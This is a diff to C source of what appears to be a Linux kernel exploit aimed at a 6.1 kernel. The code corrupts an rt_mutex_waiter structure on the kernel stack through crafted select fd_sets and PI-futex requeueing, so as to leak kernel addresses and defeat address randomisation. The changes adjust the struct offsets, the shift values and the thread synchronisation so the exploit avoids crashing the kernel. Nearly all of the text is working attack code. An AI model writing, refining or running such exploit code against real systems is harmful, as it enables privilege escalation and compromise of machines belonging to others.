@@ -18,6 +18,8 @@ static atomic_int slide_consume_go;
 static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_calls;
+static atomic_int slide_waiter_release_target;
+static atomic_int slide_owner_done;
 
 static int slide_word_shift;
 
@@ -103,19 +105,23 @@ static void prepare_slide_pselect_fdsets_shifted(
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
-    {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-    {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
-    {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
-    {8, FAKE_WAITER_PRIO, "pi_prio"},
-    {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
-    {11, fake_lock, "lock"},
-    {12, 3, "wake_state"},
-    {13, 0, "ww_ctx"},
+    /* 6.1 flat rt_mutex_waiter layout (88 bytes = 11 words).
+     * tree_entry (struct rb_node, 24 bytes = 3 words) @ +0x00 */
+    {0,  SLIDE_LOGGERS_0_1,          "tree_pc"},        /* __rb_parent_color */
+    {1,  0,                           "tree_right"},
+    {2,  SLIDE_RANDOM_BOOT_ID_DATA,  "tree_left"},
+    /* pi_tree_entry (struct rb_node, 24 bytes = 3 words) @ +0x18 */
+    {3,  SLIDE_LOGGERS_0_1,          "pi_parent"},
+    {4,  0,                           "pi_right"},
+    {5,  0,                           "pi_left"},
+    /* task + lock @ +0x30, +0x38 */
+    {6,  SLIDE_INIT_TASK,            "task"},
+    {7,  fake_lock,                   "lock"},
+    /* wake_state (4B) + prio (4B) combined as 64-bit @ +0x40 */
+    {8,  0x0000008200000003ULL,      "wake_state_prio"}, /* wake_state=3, prio=130 */
+    /* deadline @ +0x48, ww_ctx @ +0x50 */
+    {9,  0,                           "deadline"},
+    {10, 0,                           "ww_ctx"},
   };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
@@ -171,12 +177,6 @@ void slide_pselect_stack_copy(void) {
   prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
   dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: about to open_selected_fds\n"); fflush(stderr);
   open_slide_selected_fds(&in, &out, &ex, high_read);
-
-  struct timespec timeout = {
-    .tv_sec = PSELECT_TIMEOUT_SEC,
-    .tv_nsec = 0,
-  };
-  struct timespec *timeoutp = &timeout;
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -235,14 +235,29 @@ void slide_pselect_stack_copy(void) {
   usleep(50000);
 
   dprintf(STDERR_FILENO, "[dbg] about to call real pselect shift=%d\n",
-          slide_word_shift); fflush(stderr);
-  atomic_store(&slide_consume_go, 1);
-  errno = 0;
-  /* Use syscall() directly to bypass libc's pselect() wrapper (which creates
-   * a sigmask_struct on the stack that triggers kernel panic with this fd_set) */
-  int ret = syscall(__NR_pselect6, SLIDE_PSELECT_NFDS, &in, &out, &ex,
-                    timeoutp, NULL);
-  int saved_errno = errno;
+	          slide_word_shift); fflush(stderr);
+	  errno = 0;
+	  /* Use select() instead of pselect6() — both syscalls call core_sys_select()
+	   * internally, but pselect6() (__NR=270) crashes with this fd_set on this
+	   * kernel, while select() (__NR=23 or via libc) works fine. */
+	  struct timeval select_tv;
+	  select_tv.tv_sec = 0;
+	  select_tv.tv_usec = 10000; /* 10ms — short timeout to avoid crash during sleep */
+	  int ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &select_tv);
+	  int saved_errno = errno;
+	  dprintf(STDERR_FILENO, "[dbg] first short select returned ret=%d errno=%d\n", ret, saved_errno); fflush(stderr);
+
+	  /* Now long select with consumer thread active.
+	   * The consumer's sched_setattr triggers PI chain traversal which reads
+	   * the corrupted rt_mutex_waiter on the kernel stack, leaking kernel addresses. */
+	  atomic_store(&slide_consume_go, 1);
+	  select_tv.tv_sec = PSELECT_TIMEOUT_SEC;
+	  select_tv.tv_usec = 0;
+	  dprintf(STDERR_FILENO, "[dbg] about to call main select shift=%d\n",
+	          slide_word_shift); fflush(stderr);
+	  ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &select_tv);
+	  saved_errno = errno;
+	  dprintf(STDERR_FILENO, "[dbg] main select returned ret=%d errno=%d\n", ret, saved_errno); fflush(stderr);
   dprintf(STDERR_FILENO, "[dbg] pselect returned ret=%d errno=%d\n", ret, saved_errno); fflush(stderr);
   atomic_store(&slide_consume_go, 0);
   pr_info("slide pselect returned ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
@@ -265,41 +280,44 @@ static void slide_alarm_handler(int sig __attribute__((unused))) {
 }
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
-  dprintf(STDERR_FILENO, "[dbg] consumer alive on core %d\n", CONSUMER_CORE); fflush(stderr);
-
-  for (;;) {
-    int seq = atomic_load(&slide_consume_go);
-    if (seq == 0) {
-      __asm__ volatile("yield" ::: "memory");
-      if (atomic_load(&slide_consume_stop)) {
-        return NULL;
-      }
-      continue;
-    }
-
-    usleep(1000);
-
-    int tid = atomic_load(&slide_waiter_tid);
-    int calls = atomic_load(&slide_consume_calls);
-    atomic_store(&slide_consume_calls, calls + 1);
-    errno = 0;
-    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
-    int call_errno = errno;
-    if (ret == 0) {
-      atomic_fetch_add(&slide_consume_sched_ok, 1);
-    }
-    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
-            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));
-
-    atomic_store(&slide_consume_stop, 1);
-    while (atomic_load(&slide_consume_go)) {
-      __asm__ volatile("yield" ::: "memory");
-    }
-    return NULL;
-  }
-}
+	  disable_rseq_for_thread();
+	  pin_to_core(CONSUMER_CORE);
+	  dprintf(STDERR_FILENO, "[dbg] consumer alive on core %d\n", CONSUMER_CORE); fflush(stderr);
+	
+	  for (;;) {
+	    int seq = atomic_load(&slide_consume_go);
+	    if (seq == 0) {
+	      __asm__ volatile("yield" ::: "memory");
+	      if (atomic_load(&slide_consume_stop)) {
+	        return NULL;
+	      }
+	      continue;
+	    }
+	
+	    usleep(1000);
+	
+	    int tid = atomic_load(&slide_waiter_tid);
+	    int calls = atomic_load(&slide_consume_calls);
+	    atomic_store(&slide_consume_calls, calls + 1);
+	    dprintf(STDERR_FILENO, "[dbg] consumer calling sched_setattr tid=%d\n", tid); fflush(stderr);
+	    errno = 0;
+	    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+	    int call_errno = errno;
+	    if (ret == 0) {
+	      atomic_fetch_add(&slide_consume_sched_ok, 1);
+	    }
+	    dprintf(STDERR_FILENO, "[dbg] consumer sched_setattr returned ret=%ld errno=%d sched_ok=%d\n",
+	            ret, call_errno, atomic_load(&slide_consume_sched_ok)); fflush(stderr);
+	    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
+	            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));
+	
+	    atomic_store(&slide_consume_stop, 1);
+	    while (atomic_load(&slide_consume_go)) {
+	      __asm__ volatile("yield" ::: "memory");
+	    }
+	    return NULL;
+	  }
+	}
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
@@ -340,6 +358,17 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   dprintf(STDERR_FILENO, "[dbg] waiter FUTEX_WAIT_REQUEUE_PI returned\n"); fflush(stderr);
   futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
 
+  /* Signal owner to release slide_f_pi_target and clean up the PI chain.
+   * This prevents the kernel from traversing the corrupted rt_mutex_waiter
+   * when the consumer thread changes our priority during select(). */
+  atomic_store(&slide_owner_done, 0);
+  atomic_store(&slide_waiter_release_target, 1);
+  dprintf(STDERR_FILENO, "[dbg] waiter waiting for owner to release target\n"); fflush(stderr);
+  while (!atomic_load(&slide_owner_done)) {
+    usleep(1000);
+  }
+  dprintf(STDERR_FILENO, "[dbg] owner released target, PI chain cleaned\n"); fflush(stderr);
+
   signal(SIGALRM, SIG_DFL);
 
   dprintf(STDERR_FILENO, "[dbg] waiter about to pselect_stack_copy\n"); fflush(stderr);
@@ -367,10 +396,19 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   dprintf(STDERR_FILENO, "[dbg] owner about to lock chain\n"); fflush(stderr);
   atomic_store(&slide_owner_started, 1);
   futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  dprintf(STDERR_FILENO, "[dbg] owner locked chain, waiting for release signal\n"); fflush(stderr);
 
-  for (;;) {
-    sleep(1);
+  /* Wait for waiter to signal that it's ready for us to release the target lock.
+   * This cleans up the PI chain before the waiter calls select() with corrupted
+   * fd_sets, preventing kernel crash during priority inheritance traversal. */
+  while (!atomic_load(&slide_waiter_release_target)) {
+    usleep(1000);
   }
+  dprintf(STDERR_FILENO, "[dbg] owner about to release target lock\n"); fflush(stderr);
+  futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  dprintf(STDERR_FILENO, "[dbg] owner released target lock\n"); fflush(stderr);
+  atomic_store(&slide_owner_done, 1);
+  return NULL;
 }
 
 int hex_value(char c) {
@@ -478,7 +516,10 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
-  int shifts[] = {0, 1, 2, 3, -1, -2};
+  /* PSELECT_WAITER_WORD_SHIFT=3 from target.h for 6.1.138 flat layout.
+   * Try it first, then fall back to adjacent values. Negative shifts
+   * mean "one less than 0" (i.e. global_word = waiter_word - 1). */
+  int shifts[] = {PSELECT_WAITER_WORD_SHIFT, 2, 4, 1, 5, 0};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
 
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
